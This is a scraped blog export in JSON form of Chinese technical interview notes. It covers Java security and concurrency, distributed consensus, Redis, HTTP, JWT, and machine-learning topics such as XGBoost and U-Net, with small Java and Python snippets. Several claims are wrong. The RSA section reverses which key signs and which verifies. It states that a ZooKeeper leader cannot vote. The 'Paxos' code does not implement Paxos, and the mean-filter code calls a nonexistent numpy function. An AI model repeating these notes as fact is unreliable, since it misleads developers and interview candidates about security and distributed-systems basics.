安全框架，提供了身份验证、授权、加密和会话管理等安全组件。Shiro 的组件包括： Subject：Subject 是 Shiro 的核心组件，代表了当前用户的安全操作。Subject 可以是一个人、一台机器或者一个后台任务。 SecurityManager：SecurityManager 是 Shiro 的安全管理器，负责管理所有 Subject 的安全操作。SecurityManager 是 Shiro 的核心组件，它协调着所有的安全操作。 Authenticator：Authenticator 是 Shiro 的身份验证器，用于验证用户的身份。Authenticator 可以使用多种身份验证方式，例如用户名和密码、数字证书、单点登录等。 Authorizer：Authorizer 是 Shiro 的授权器，用于授权用户的访问权限。Authorizer 可以使用多种授权方式，例如基于角色的访问控制、基于权限的访问控制等。 Realm：Realm 是 Shiro 的数据源，用于获取用户的身份信息和访问控制信息。Realm 可以从数据库、LDAP、文件等数据源中获取用户信息和访问控制信息。 SessionManager：SessionManager 是 Shiro 的会话管理器，用于管理用户的会话信息。SessionManager 可以管理用户的登录状态、超时时间、会话 ID 等信息。 CacheManager：CacheManager 是 Shiro 的缓存管理器，用于缓存用户的身份信息和访问控制信息。CacheManager 可以使用多种缓存方式，例如内存缓存、Ehcache 缓存、Redis 缓存等。 通过这些组件的协作，Shiro 可以为 Java 应用程序提供全面的安全保护。 分布式一致算法分布式一致算法是一种用于解决分布式系统中数据一致性问题的算法。在分布式系统中，由于各个节点之间的通信延迟、网络故障等原因，可能会导致数据的不一致性，即不同节点上的数据可能不一致或者不完整。分布式一致算法旨在保证分布式系统中的数据在不同节点之间保持一致。 常见的分布式一致算法包括： Paxos 算法：Paxos 算法是一种经典的分布式一致算法，它通过选举一个主节点来决定数据的更新和复制过程，保证了数据的一致性。Paxos 算法具有高可用性和容错性，但是实现较为复杂。 1.选举一个 proposer 节点，提出一个提案，提案包含提案编号和提案内容。2.proposer 节点将提案发送给所有的 acceptor 节点。3.Acceptors 节点接收到提案后，如果提案编号大于当前的提案编号，则接受提案，并将自己的 Accepted proposal number 和 Accepted proposal value 更新为当前的提案编号和提案内容。 4.并将提案内容广播给所有的 learner 节点。5.learner 节点接收到提案内容后，将提案内容更新到自己的状态机中。也就确定了最终的提案内容。如果 Proposer 节点在一段时间内没有收到超过半数的 Acceptor 节点的回复，则重新发起提案，提案编号加 1，重新开始提案流程。 //简易实现 import java.util.HashMap; import java.util.Map; public class Paxos&#123; private int proposalNumber; private int acceptedValue; private Map&lt;Integer, Integer&gt; acceptors; public Paxos()&#123; proposalNumber = 0; acceptedValue = -1; acceptors = new HashMap&lt;&gt;(); &#125; public void prepare(int proposalNumber)&#123; if(proposalNumber &gt; this.proposalNumber)&#123; this.proposalNumber = proposalNumber; &#125; int maxAcceptedValue = -1; int maxAcceptedProposalNumber = 0; for(int acceptor : acceptors.keySet())&#123; int acceptedProposalNumber = acceptors.get(acceptor); if (acceptedProposalNumber &gt; maxAcceptedProposalNumber) &#123; maxAcceptedProposalNumber = acceptedProposalNumber; maxAcceptedValue = acceptor; &#125; &#125; if (maxAcceptedProposalNumber &gt;= proposalNumber) &#123; System.out.println(&quot;Proposal rejected&quot;); &#125; else &#123; System.out.println(&quot;Proposal accepted&quot;); acceptors.put(proposalNumber, maxAcceptedValue); &#125; &#125; public void accept(int proposalNumber, int value) &#123; if (proposalNumber &gt;= this.proposalNumber) &#123; this.proposalNumber = proposalNumber; acceptedValue = value; System.out.println(&quot;Accepted value: &quot; + value); &#125; else &#123; System.out.println(&quot;Proposal rejected&quot;); &#125; &#125; public static void main(String[] args) &#123; Paxos paxos = new Paxos(); paxos.prepare(1); paxos.accept(1, 10); paxos.prepare(2); paxos.accept(2, 20); paxos.prepare(3); paxos.accept(3, 30); &#125; &#125; Raft 算法：Raft 算法是一种相对简单的分布式一致算法，它将分布式系统中的节点划分为 Leader、Follower 和 Candidate 三种角色，通过选举 Leader 来实现数据一致性。Raft 算法相对于 Paxos 算法来说更易于理解和实现。 ZooKeeper 算法：ZooKeeper 是一个分布式协调服务，它提供了一套高级 API，可以用于解决分布式系统中的一致性问题。ZooKeeper 使用了 ZAB（ZooKeeper Atomic Broadcast）协议来实现数据的一致性。是一种基于 Paxos 算法的分布式一致性算法，用于解决分布式系统中的数据一致性问题。ZooKeeper 算法的核心思想是通过多轮投票来选举一个 Leader 节点，并保证多个节点之间的数据一致性。ZooKeeper 算法在分布式系统中得到了广泛的应用，例如 Hadoop、Kafka 等分布式系统都使用了 ZooKeeper 算法来实现数据一致性和选举机制。 Gossip 算法：Gossip 算法是一种基于流言的分布式一致算法，它通过节点之间的通信来实现数据的一致性。Gossip 算法具有高可用性和容错性，但是实现较为复杂。 这些分布式一致算法都有各自的特点和适用场景，选择合适的算法需要根据具体的分布式系统的需求和特点来决定。 zookeeper 那些能参与投票，leader 能投票吗在 ZooKeeper 中，只有 follower 和 observer 节点可以参与投票，而 leader 节点不能投票。当一个 ZooKeeper 集群启动时，所有节点都是 follower 节点。当选举开始时，每个 follower 节点会给自己投票，并且它们还会发送投票请求给其他节点。每个节点会在收到大多数节点的投票后选择一个 leader。一旦选举完成，节点中的一个 follower 会成为 leader，而其他节点则成为 follower 或 observer。leader 节点负责处理客户端请求，并将更新的状态复制到其他节点上。follower 节点则会接受并复制 leader 节点的状态。需要注意的是，observer 节点与 follower 节点的功能相似，但它们不参与选举过程，也不具有投票权。它们只是被动地接收和复制 leader 节点的状态。 Netty 零拷贝实现Netty 零样本是指在数据传输过程中，避免将数据从内核空间复制到用户空间，从而提高数据传输的效率，在传统的数据传输方式中，数据需要从内核空间复制到用户空间，然后再复制到网络缓存区，这样会产生大量的 CPU 开销和内存拷贝，降低数据传输的效率，而 Netty 零样本拷贝技术可以避免这种情况的发生，提高数据传输的效率。 实现过程： 使用 Direct Memory Buffer(直接内存缓存区)来避免数据的内存拷贝，Direct Memory Buffer 是一种直接分配在物理内存中的缓存区，它不会占用堆内存，也不会被 JVM 垃圾回收，它可以直接在内存中进行读写操作，而不需要将数据从内核空间复制到用户空间。使用 ByteBuf 类来实现 Direct Memory Buffer 的操作，ByteBuf 类时 Netty 中的一个缓冲区类，它可以直接操作 Direct Memory Buffer，从而避免了数据的内存拷贝。使用 FileRegion 类来实现文件的零拷贝，FileRegion 类是 Netty 中的一个文件传输类，它可以将文件从磁盘读取到内存中，而不用将文件从磁盘复制到内存中。从而避免了数据的内存拷贝。 通过使用 Direct Memory Buffer、ByteBuf 类和 FileRegion 类，Netty 可以实现零拷贝技术，从而提高数据传输的效率。在 Netty 中，可以通过配置 ChannelOption.ALLOCATOR 参数来选择使用 Direct Memory Buffer 还是 Heap Buffer（堆内存缓冲区），从而实现零拷贝技术。 volatile，如何感知到变量变化的在 Java 中，使用 volatile 关键字修饰的变量可以保证多线程之间的可见性，即当一个线程修改了 volatile 变量的值时，其他线程可以立即感知到这个变化，这是因为 volatile 变量的修改会立即刷新到内存中，而其他线程读取 volatile 变量时会从主内存中读取最新的值，而不是从线程的本地缓存中读取。当一个线程读取一个 volatile 变量时，它会从主内存中读取最新的值，并将这个值复制到线程的本地缓存中，当这个线程修改了这个 volatile 变量的值时，它会将这个值写回主内存中，并通知其他线程刷新缓存，其他线程读取这个 volatile 变量时，会从主内存中读取最新的值。而不是从本地缓存中读取。因此使用 volatile 关键字修饰的变量可以保证多线程之间的可见性。从而避免线程之间的数据不一致问题，但是需要注意的是，volatile 变量智能保证可见性，却不能保证原子性，如需保护原子性，需要使用 synchronized 关键字或者 Lock 锁。 Redis 高可用Redis 高可用是指在 Redis 集群中，当其中一个节点出现故障或不可用时，其他节点可以继续提供服务，保证系统的可用性和稳定性。 实现 Redis 高可用的常见方式有以下几种： 主从复制（Master-Slave Replication）：通过将一个节点设置为主节点（Master），其他节点设置为从节点（Slave），主节点负责写入数据，从节点负责读取数据和备份数据。当主节点出现故障时，从节点可以自动切换为主节点，保证系统的可用性。 哨兵模式（Sentinel）：哨兵模式是在主从复制的基础上引入了哨兵节点，哨兵节点负责监控主节点的状态，并在主节点不可用时自动将一个从节点升级为主节点。哨兵模式可以实现自动故障转移和自动恢复，提高系统的可用性。 集群模式（Cluster）：集群模式是通过将数据分片存储在多个节点上，实现数据的分布式存储和负载均衡。每个节点都可以处理部分数据的读写请求，当一个节点出现故障时，其他节点可以继续提供服务。集群模式可以实现水平扩展和高性能。 需要注意的是，无论是主从复制、哨兵模式还是集群模式，都需要在配置和部署上进行一定的设置和调整，以确保系统的高可用性和稳定性。 Http 跨域问题在 HTTP 协议中，跨域是指在浏览器中向不同域名或端口发送请求时，由于浏览器的同源策略限制，请求会被拒绝。同源策略是浏览器的一种安全机制，用于防止恶意网站窃取用户数据。 要解决跨域问题，可以通过以下几种方法： JSONP（JSON with Padding）：JSONP 利用了 script 标签没有跨域限制的特性，通过动态创建一个 script 标签，将需要跨域获取数据的 URL 作为其 src 属性值，服务器返回的数据会被包裹在一个函数调用中，这个函数是前端预先定义好的，服务器返回的数据会作为参数传入这个函数中，从而实现跨域获取数据。 CORS（Cross-Origin Resource Sharing）：CORS 是一种新的跨域解决方案，它通过在 HTTP 头部添加一些字段来告诉浏览器是否允许当前页面跨域请求资源。如果服务器支持 CORS，且在响应头中设置了相应的字段，浏览器就会允许跨域请求。 代理服务器：通过在同域名下创建一个代理服务器，将跨域请求发送给代理服务器，再由代理服务器向目标服务器发送请求，然后将目标服务器的响应返回给前端。这样就绕过了浏览器的同源策略限制。 WebSocket：WebSocket 是一种全双工通信协议，它可以在浏览器和服务器之间建立一个持久的连接，实现实时通信。由于 WebSocket 是在 HTTP 握手阶段进行协议升级，而不是通过 XMLHttpRequest 对象发送请求，所以它不受同源策略的限制。 以上是几种常见的跨域解决方案，不同的场景可以选择适合的方法来解决跨域问题。 TCP 长连接TCP 长连接是指在 TCP 连接建立后，客户端和服务器之间保持持久的连接状态，可以持续发送和接收数据，而不需要每次通信都重新建立连接。 实现 TCP 长连接的方法有以下几种： 保持连接：客户端和服务器在建立连接后，双方都保持连接状态，直到其中一方主动关闭连接。这样可以避免每次通信都重新建立连接，提高通信效率。 心跳机制：客户端和服务器定期发送心跳包来维持连接状态。心跳包是一个空的或者特定格式的数据包，用于告知对方连接仍然有效。如果一方在一定时间内没有收到心跳包，就会认为连接已经断开，然后重新建立连接。 连接池：客户端和服务器建立一个连接池，事先创建多个 TCP 连接并保存在连接池中。当需要发送数据时，从连接池中获取一个可用的连接进行通信，发送完数据后，将连接返回到连接池中，以供其他请求使用。 需要注意的是，长连接也需要考虑连接的稳定性和资源的占用情况。如果连接长时间没有数据传输，可以考虑关闭连接，避免资源的浪费。 HTTP 如何操作浏览器缓存HTTP 可以通过设置响应头来操作浏览器缓存。以下是一些常用的操作： 设置 Expires 头：该头部指定了一个日期&#x2F;时间，表示响应的过期时间。如果浏览器缓存中有相同的资源，并且过期时间未到，则浏览器直接从缓存中获取资源，而不发送请求到服务器。 设置 Cache-Control 头：该头部用于控制缓存的行为。常见的指令有： no-cache：表示不使用缓存，每次请求都要发送到服务器。 no-store：表示不缓存任何响应内容。 max-age：表示资源在缓存中的最大有效时间（以秒为单位）。 public：表示响应可以被任何缓存（包括中间代理服务器）缓存。 private：表示响应只能被客户端缓存，中间代理服务器不能缓存。 设置 Last-Modified 头和 If-Modified-Since 头：服务器可以在响应中发送 Last-Modified 头，该头部指定了资源的最后修改时间。当浏览器再次请求该资源时，可以发送 If-Modified-Since 头，该头部的值为上次响应中的 Last-Modified 值。如果资源的最后修改时间与 If-Modified-Since 头的值相同，则服务器返回一个 304 Not Modified 响应，表示资源未发生变化，浏览器可以使用缓存的版本。 设置 ETag 头和 If-None-Match 头：服务器可以在响应中发送 ETag 头，该头部是一个唯一标识符，表示资源的版本。当浏览器再次请求该资源时，可以发送 If-None-Match 头，该头部的值为上次响应中的 ETag 值。如果资源的 ETag 与 If-None-Match 头的值相同，则服务器返回一个 304 Not Modified 响应，表示资源未发生变化，浏览器可以使用缓存的版本。 需要注意的是，浏览器缓存是根据资源的 URL 进行缓存的，如果 URL 不同，则浏览器会认为是不同的资源，重新请求并缓存。 消息队列消息队列是一种在应用程序之间传递消息的通信模式。它通过将消息发送到一个中间的队列中，然后由接收者从队列中获取消息进行处理。消息队列可以实现异步通信，提供解耦和可靠性。 在消息队列中，发送者将消息发送到队列中，而不需要直接与接收者进行通信。接收者可以根据自己的处理能力和需求从队列中获取消息进行处理。这种方式可以实现发送者和接收者之间的解耦，使得它们可以独立地进行开发和部署。 消息队列还可以提供可靠性保证。当消息发送到队列中时，它们会被持久化保存，即使在发送者或接收者出现故障的情况下，消息也不会丢失。一旦接收者准备好处理消息，它可以安全地从队列中获取消息进行处理。 消息队列还可以实现消息的广播和订阅。发送者可以将消息发送到一个主题中，而不是特定的接收者。接收者可以订阅感兴趣的主题，从而接收到相关的消息。 消息队列可以在分布式系统中起到重要的作用。它可以帮助解决系统之间的通信问题，提高系统的可伸缩性和可靠性。常见的消息队列系统包括 RabbitMQ、Apache Kafka 和 ActiveMQ 等。 JWT 签名加密算法JWT（JSON Web Token）由三部分组成：Header（头部）、Payload（负载）和 Signature（签名）。 Header（头部）：Header 包含两个部分，分别是 token 的类型（即 JWT）和所使用的算法（例如 HMAC SHA256 或 RSA 等）。头部通常采用 JSON 格式进行编码，并使用 Base64Url 编码。示例：{“alg”: “HS256”,”typ”: “JWT”} Payload（负载）：Payload 是 JWT 的主要内容，包含了要传递的数据。Payload 可以包含一些预定义的声明（例如 iss（签发者）、exp（过期时间）、sub（主题）等）以及自定义的声明。声明分为三类：注册声明、公共声明和私有声明。载荷通常也采用 JSON 格式进行编码，并使用 Base64Url 编码。示例：{“sub”: “1234567890”,”name”: “John Doe”,”iat”: 1516239022} Signature（签名）：Signature 用于验证消息的完整性，防止数据被篡改。Signature 的计算需要使用 Header 和 Payload 以及一个密钥（secret）来完成。具体的算法取决于 Header 中指定的算法类型。示例：HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)总结：JWT 的头部包含了所使用的算法，负载包含了要传递的数据，签名用于验证消息的完整性。签名的计算需要使用头部、负载和密钥来完成，具体的算法由头部指定。JWT 的加密算法通常包括对称加密和非对称加密两种方式。对称加密使用相同的密钥进行加密和解密，常用的算法包括 HMAC SHA256 和 AES。非对称加密使用公钥进行加密，私钥进行解密，常用的算法包括 RSA 和 ECDSA。需要注意的是，JWT 只提供了身份验证和授权的机制，但并不提供加密功能。因此，在使用 JWT 时，需要注意保护密钥的安全性，以防止密钥泄露导致数据被篡改。 RSA 如何运用到 jwt 中RSA 是一种非对称加密算法，它使用公钥进行加密，私钥进行解密，在 JWT 中，使用 RSA 算法进行签名和验证的过程如下： 生成一对公钥和私钥，公钥用于签名，私钥用于验证。 使用私钥对 JWT 的头部和负载进行签名，生成签名字符串。签名过程通常使用 SHA256 算法。 使用公钥进行验证，在验证 JWT 时，使用公钥对 Header 和 Payload 进行验证，验证签名是否正确。 需要注意的是，使用 RSA 算法记性签名和验证时需要保护私钥的安全性，以防止私钥泄露导致数据被篡改，同时，需要将公钥传递给需要验证 JWT 的服务端，以便进行验证。在使用 RSA 算法进行签名和验证时，需要在 JWT 的 Header 中指定算法类型为 RS256。 synchronized 和 volatile 的区别synchronized 和 volatile 是 Java 中用于实现线程安全的两种关键字，但它们有一些区别。 访问方式：synchronized 是通过获取对象的锁来实现同步访问，而 volatile 是通过标记变量为可见性变量来实现同步访问。 作用范围：synchronized 可以用于修饰方法、代码块和静态方法，可以实现对对象或类的同步访问；而 volatile 只能修饰变量，用于实现变量的可见性。 原子性：synchronized 可以保证代码块或方法的原子性操作，即同一时间只能有一个线程访问，其他线程需要等待；而 volatile 不能保证原子性操作。 可见性：volatile 可以保证变量的可见性，即当一个线程修改了 volatile 修饰的变量的值，其他线程能够立即看到最新的值；而 synchronized 也可以实现可见性，但是需要在进入和退出同步块时，通过刷新主内存来实现。 顺序性：volatile 可以禁止指令重排序，保证代码的执行顺序；而 synchronized 也可以保证代码的有序性，即同一时间只有一个线程执行。 总的来说，synchronized 用于实现线程安全的同步访问，可以保证原子性和可见性，但是性能较差；而 volatile 用于实现变量的可见性，不能保证原子性操作，但是性能较好。 什么是上下文切换，URL 解析过程上下文切换是操作系统中的一种机制，用于在多任务环境中切换不同任务之间的执行上下文。当一个任务需要被中断，让另一个任务执行时，操作系统会保存当前任务的执行状态（例如寄存器的值、程序计数器等），然后加载下一个任务的执行状态，使其能够继续执行。这个过程就是上下文切换。 上下文切换的目的是实现多任务并发执行，提高系统的资源利用率和响应性能。但是上下文切换也会带来一定的开销，因为切换过程需要保存和恢复任务的执行状态，以及切换时可能会导致缓存失效等问题。 URL 解析过程是指将一个 URL（Uniform Resource Locator，统一资源定位符）转换成可理解和处理的信息的过程。URL 是用于标识互联网上资源位置的一种标准格式。URL 解析过程包括以下步骤： 协议解析：解析 URL 中的协议部分，例如 http、https 等。 域名解析：解析 URL 中的域名部分，将域名转换成对应的 IP 地址。 端口解析：解析 URL 中的端口部分，确定要连接的目标端口。 路径解析：解析 URL 中的路径部分，确定要请求的资源路径。 查询参数解析：解析 URL 中的查询参数部分，获取传递给服务器的参数信息。 锚点解析：解析 URL 中的锚点部分，确定页面中的定位位置。 URL 编码解析：解析 URL 中的编码部分，将编码的字符转换成原始字符。 URL 解析过程是网络通信中的重要环节，它将用户输入的 URL 转换成计算机可理解和处理的信息，以便进行网络请求和资源获取。 Http 有哪些方法HTTP 有以下方法： GET：用于获取资源，请求的 URL 中包含了请求的参数，响应中返回请求的资源。 POST：用于提交数据，将数据发送到服务器进行处理，常用于表单提交。 HEAD：类似于 GET 方法，但只返回响应头部信息，不返回实体主体部分。 PUT：用于向服务器上传新的实体，请求的 URL 中包含了请求的资源，如果资源已存在则替换。 DELETE：用于删除指定的资源。 OPTIONS：用于获取服务器支持的 HTTP 方法。 TRACE：用于在请求-响应链路上追踪发送的请求。 CONNECT：用于建立与目标资源的隧道连接。 其中，GET 方法用于获取资源，不会对服务器上的数据进行修改。 进程和线程的区别进程和线程是操作系统中的两个重要概念，它们之间有以下区别： 定义：进程是操作系统中的一个执行单元，表示程序在计算机上的一次执行过程；线程是进程中的一个实体，是 CPU 调度的基本单位，表示程序执行流的最小单元。 资源占用：每个进程都有独立的地址空间、文件描述符、打开的文件等资源，进程之间相互独立；而线程共享进程的地址空间和资源，包括文件、I&#x2F;O 等。 并发性：由于进程拥有独立的资源，因此不同进程之间可以并发执行，互补干扰，而线程共享进程的资源，因此不同线程之间需要进程同步和互斥，以避免竞争条件和死锁等问题。 创建和销毁：创建进程需要分配独立的地址空间和资源，销毁进程需要回收这些资源；创建线程相对较快，销毁线程也较快，因为线程共享进程的资源。 切换开销：由于进程拥有独立的地址空间和资源，进程间切换的开销较大；而线程切换的开销较小，因为线程共享进程的资源。 通信方式：进程间通信需要使用特定的机制，如管道、消息队列、共享内存等；线程间通信更加方便，可以直接读写共享变量。 并发性：多个进程之间可以并发执行，每个进程有自己的执行流；线程之间也可以并发执行，但是多个线程共享同一个进程的执行流。 总的来说，进程是资源分配的基本单位，线程是执行流的基本单位。进程之间相互独立，线程之间共享资源。进程切换开销大，线程切换开销小。进程间通信需要特定机制，线程间通信更加方便。","categories":[{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/categories/%E9%9D%A2%E8%AF%95/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/tags/%E9%9D%A2%E8%AF%95/"},{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"}]},{"title":"深度学习面试(二)","slug":"day_two","date":"2022-04-07T08:30:16.000Z","updated":"2023-04-18T09:32:54.196Z","comments":true,"path":"2022/04/07/day_two/","link":"","permalink":"https://dfsgwb.github.io/2022/04/07/day_two/","excerpt":"","text":"说说XGBoost和GBDT的不同: XGBoost和GBDT都是基于树的集成学习算法，但在实现细节和性能上存在一些不同： 对于目标函数的优化：XGBoost采用了类似于牛顿法的二阶泰勒展开方式进行目标函数的极值优化，加快了收敛速度；而GBDT采用的是一阶泰勒展开。 对于特征的选择：XGBoost采用增益和覆盖度的综合指标选择特征；GBDT采用的是信息熵或基尼指数。 对于剪枝的处理：XGBoost对于树的结构进行分裂之后，采用正则化的方式进行剪枝；GBDT采用的是贪心算法来选择最优分裂点。 对于模型的并行计算：XGBoost使用了多线程并行运算，在内存使用上更加高效；GBDT则只能串行计算。 对于缺失值的处理：XGBoost可以自动地学习处理缺失值，GBDT则需要另外进行预处理。综上所述，XGBoost在目标函数优化、特征选择、树结构剪枝以及模型的并行计算方面都具有更大的优势，因此在许多竞赛中取得了很好的成绩。但在数据处理方面相对要求更高。而GBDT则更为直观易懂，数据要求也相对较低。 XGBoost和GBDT都是决策树集成学习算法，它们的区别主要涵盖以下几个方面： 1. 算法原理：GBDT是一种基于残差学习的决策树集成算法，每一次学习目标是拟合当前模型残差，使得后续模型能够更好地拟合样本。而XGBoost是一种基于梯度提升的决策树算法，每一次学习目标是拟合当前模型梯度，使得后续模型能够更好地逼近损失函数。 2. 损失函数：在实际应用中，XGBoost支持更广泛的损失函数选择，除了GBDT中常用的平方误差和绝对误差，还支持logistic、softmax等分类问题的损失函数。而且XGBoost能够集成不同的损失函数。 3. 正则化：XGBoost加入了二阶导数信息来进行正则化，防止过拟合效果更好。同时，XGBoost还可以通过结构化的正则化方式减少过拟合现象。 4. 并行化处理：相比于GBDT，XGBoost引入了缓存访问和特征采样等并行处理方式，可以通过并行化处理更快地训练模型。 5. 可扩展性：XGBoost拓展性更强，支持分布式计算，可以在大数据环境下使用，而GBDT则只能在单机上运行。 总的来说，XGBoost是一个更加高效、灵活、容易扩展的算法，能够更好地解决现实生活中的复杂问题，在机器学习和数据挖掘领域中得到了广泛应用。 高并发技术实现高并发技术的方式有以下几种： 负载均衡：将请求分发到多个服务器上，避免单一服务器负载过高。 缓存技术：将数据缓存到内存中，减少数据库的访问次数。 分布式技术：将系统拆分成多个独立的子系统，每个子系统独立运行，提高系统的并发能力。 异步处理：将一些耗时的操作放到异步线程中进行处理，避免阻塞主线程。 数据库优化：通过优化数据库结构、索引、SQL语句等方式，提高数据库的性能。 CDN加速：将静态资源（如图片、视频等）缓存到CDN节点上，加速用户访问速度。 消息队列：通过消息队列实现异步处理，提高系统的并发能力。 集群技术：将多台服务器组成集群，实现负载均衡和故障转移。 分库分表：将数据库拆分成多个库和表，提高数据库的并发性能。 代码优化：通过优化代码结构、算法等方式，提高系统的性能和并发能力。 特征选择的方法 Filter方法：通过对数据集进行统计分析，选出与目标变量相关性较高的特征。常用的统计方法包括相关系数、卡方检验、方差分析等。 Wrapper方法：将特征选择看作是一个搜索问题，通过不断地试错，找到最优的特征子集。常用的搜索算法包括递归特征消除（Recursive Feature Elimination）和遗传算法（Genetic Algorithm）等。 Embedded方法：在模型训练的过程中，同时进行特征选择。常用的方法包括Lasso回归、岭回归、决策树、随机森林等。 基于树模型的特征选择方法：通过构建决策树或随机森林等树模型，计算每个特征的重要性得分，并选择重要性得分高的特征。 PCA（Principal Component Analysis）方法：通过主成分分析，将原始特征转化为一组新的不相关的特征，然后选取其中对目标变量有较大影响的特征。 模型集成方法：通过将多个模型的预测结果进行集成，筛选出重要的特征。常用的集成方法包括投票法、平均法、堆叠法等。 基于深度学习的特征选择方法：通过深度神经网络等深度学习模型，自动学习并提取特征，然后选取对目标变量有影响的特征。 基于信息增益的特征选择方法：通过计算每个特征对于分类的信息增益，选取信息增益高的特征。 基于稳定性选择的特征选择方法：通过对数据集进行多次随机采样和特征选择，筛选出在不同采样和特征选择情况下都被选中的特征。 基于数据降维的特征选择方法：通过将数据降维到低维空间，然后选取对目标变量有影响的低维特征。常用的降维方法包括主成分分析、因子分析、独立成分分析等 深度和宽度分别对神经网络的影响，相同参数量下，更深更窄的神经网络和更浅更宽的神经网络对模型的影响深度——神经网络的层数 宽度——每层的通道数 分辨率——是指网络中特征图的分辨率 深度和宽度是深度神经网络的两个基本维度，分辨率不仅取决于网络，也与输入图片的尺寸有关。 简单总结就是： 1.更深的网络，有更好的非线性表达能力，可以学习更复杂的变换，从而可以拟合更加复杂的特征，更深的网络可以更简单地学习复杂特征。 网络加深会带来梯度不稳定、网络退化的问题，过深的网络会使浅层学习能力下降。深度到了一定程度，性能就不会提升了，还有可能会下降。 2.足够的宽度可以保证每一层都学到丰富的特征，比如不同方向，不同频率的纹理特征。宽度太窄，特征提取不充分，学习不到足够信息，模型性能受限。 宽度贡献了网络大量计算量，太宽的网络会提取过多重复特征，加大模型计算负担。 3.提升网络性能可以先从宽度入手，提高每一层的通道的利用率、用其他通道的信息补充较窄的层，找到宽度的下限，用尽量小的计算量得到更好的性能。 PCA和LDA的区别PCA和LDA是两种常见的降维技术，它们的区别主要体现在以下几个方面：目的不同：PCA是一种无监督的降维技术，其主要目的是尽可能地保留原始数据的方差信息；而LDA是一种有监督的降维技术，其主要目的是在保留原始数据的信息的同时，找到最能区分不同类别的特征。输入数据不同：PCA可以应用于任何类型的数据，包括连续型和离散型数据，而LDA只能应用于有类别标签的连续型数据。输出结果不同：PCA得到的结果是一组新的无相关变量，这些变量被称为主成分；而LDA得到的结果是一组新的特征变量，这些变量被设计成能够最好地区分不同类别的数据。适用场景不同：PCA通常用于数据的预处理和降维，以便更好地可视化和理解数据；而LDA通常用于分类和识别问题，以提高分类的准确度。","categories":[{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"深度学习面试(一)","slug":"day_one","date":"2022-04-07T08:30:16.000Z","updated":"2023-04-12T00:58:06.864Z","comments":true,"path":"2022/04/07/day_one/","link":"","permalink":"https://dfsgwb.github.io/2022/04/07/day_one/","excerpt":"","text":"U-Net的业务场景： U-Net是一种深度学习神经网络结构，主要用于图像分割任务，特别是医学图像分割。相比于普通的CNN，U-Net具有以下特点： 1. U-Net是一种全卷积网络结构，可以对任意大小的图像进行分割，而不需要调整输入图像大小。 2. U-Net采用类似编码器-解码器的结构，通过对输入图像进行多次下采样和上采样，能够提取图像的多层次特征信息。 3. U-Net的解码器部分采用反卷积操作，能够对特征图进行上采样恢复，从而实现尺寸输出等同于原图的效果。 4. U-Net在标注数据有限的情况下，能够获取到更高质量的分割结果，有一定的鲁棒性。U-Net的使用场景，主要是医学图像分割任务，例如血管分割、肺部分割、细胞分割等领域。同时，U-Net也可以用于其他类型的图像分割任务。 U-Net相较于CNN的特点UNET是一种基于卷积神经网络(CNN)的语义分割模型，具有以下特点： 1. 全卷积结构：UNET采用全卷积结构，使得模型可以接受任意大小的输入图像，而输出相同大小的分割结果。 2. 对称结构：UNET具有对称的编码器-解码器结构，编码器对输入图像进行多层次的特征提取，解码器则将特征图恢复到与输入相同分辨率的输出分割图。 3. 上采样和跳跃连接：UNET使用上采样操作将编码器中的低分辨率特征图恢复到高分辨率，同时使用跳跃连接将编码器中的特征图与解码器中的特征图进行连接，增加了分割结果的精度。 4. 数据增强：UNET采用数据增强技术，通过旋转、缩放、翻转等操作扩充训练数据集，提高模型泛化性能。相比之下，CNN通常用于图像分类任务，它的特点包括： 1. 单一的输出：CNN输出一个标量或向量，表示图像的类别或相关属性。 2. 全连接结构：CNN包含全连接层来将图像特征映射到标签空间。 3. 低级特征提取：CNN通常使用较少的卷积层提取低级特征，因此对于复杂任务需要多个CNN串联才能实现。 4. 精度和速度折衷：CNN是为实时预测设计的，因此在精度和速度之间做出了折衷。 coding：写一个shuffle函数打乱一维数组：遍历一遍并每个元素与随机元素互换 import random def shuffle(arr): for i in range(len(arr)): rand_idx = random.randint(i,len(arr)-1) arr[i], arr[rand_idx] = arr[rand_idx], arr[i] return arr 对h×w的二维灰度图进行均值滤波，模板矩阵k×k：双重循环遍历二维数组，其中嵌套双重循环加和k×k个元素求均值 ```py import numpy as np &#39;&#39;&#39; 函数的输入参数为原图像img和模板大小k，返回值为均值滤波后的图像。 首先定义了模板中心距离边界的偏移量h_k和w_k。然后定义函数返回值result，并初始化为一个和原图像大小相同的全0矩阵。 接下来，通过双重循环遍历原图像的每个像素点(i, j)，并将模板覆盖在当前像素点(i, j)上。 对于模板中的每一个元素(m, n)，需要考虑其是否越界。这里用了max和min函数来确保不超出原图像的边界。 对于在原图像范围内的模板元素，将其像素值累加到sum变量中，并将计数器count加1。最后，用sum除以count来求这k×k个元素的均值，并将结果赋值给result矩阵中对应的像素值。 循环结束后，函数返回result作为均值滤波后的图像。 &#39;&#39;&#39; def mean_filter(img, k): h, w = img.shape h_k, w_k = k//2, k//2 result = np.zero((h, w), dtype=np.uint8) for i in range(h): for j in range(w): sum = 0 count = 0 for m in range(max(i-h_k, 0), min(i+h_k+1, h)): for n in range(max(j-w_k, 0), min(j+w_k+1, w)): sum += img[m, n] count += 1 result[i, j] = sum // count return result DenseUNet和ResNetDenseUNet和ResUNet是两种用于语义分割的卷积神经网络模型。DenseUNet模型基于DenseNet的思想，将迭代连接（skip connections）应用到了UNet模型中，提高了模型的学习能力和特征表达能力。该模型还针对边缘区域的分割效果差的问题，采用了VGG-16 的结构对边缘区域进行优化。 DenseUNet的设计思想主要是将经典的UNet网络与稠密连接（Dense Connection）的概念相结合，以提高图像分割的性能。稠密连接是指将前一层输出与当前层输入连接在一起，使得当前层可以接收到前一层的所有信息，从而增强了特征的复用性，加快了特征传递速度，提高了模型的训练效率。具体来说，DenseUNet将UNet的编码器和解码器部分中的每个卷积块都改成稠密连接块。在编码器部分，每个稠密连接块由一个3×3 